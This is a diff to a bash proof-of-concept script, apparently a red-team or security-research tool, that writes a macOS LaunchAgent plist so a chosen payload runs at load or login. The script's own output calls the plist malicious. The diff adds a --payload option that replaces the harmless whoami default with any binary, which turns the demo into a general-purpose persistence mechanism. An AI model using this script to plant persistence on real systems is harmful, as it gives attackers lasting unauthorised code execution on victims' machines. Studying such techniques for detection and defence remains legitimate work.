@@ -4,20 +4,24 @@
 # Writes a LaunchAgent .plist file that executes a payload (default: `whoami`)
 # upon load or user login via launchctl.
 # Permit execution with: chmod +x poc.sh
-# Run: ./poc.sh
+# Run: ./poc.sh [--payload /path/to/binary]
 # Author: SentinelByte
-# Version: 1.04
+# Version: 1.05
 # ------------
 
+set -euo pipefail
+
 # Configuration
-# Name of the LaunchAgent .plist
 PLIST_NAME="com.user.launchdemo.plist"
-
-# Full path to where the .plist will be written (per-user LaunchAgents dir)
 PLIST_PATH="$HOME/Library/LaunchAgents/$PLIST_NAME"
+PAYLOAD="/usr/bin/whoami"  # default; override with --payload
 
-# Command to be executed by the LaunchAgent on load (PoC: harmless `whoami`)
-PAYLOAD="/usr/bin/whoami"
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        --payload) PAYLOAD="$2"; shift 2 ;;
+        *) echo "Usage: $0 [--payload /path/to/binary]" >&2; exit 1 ;;
+    esac
+done
 
 # Main Logic
 echo "[*] Writing malicious LaunchAgent plist to: $PLIST_PATH"
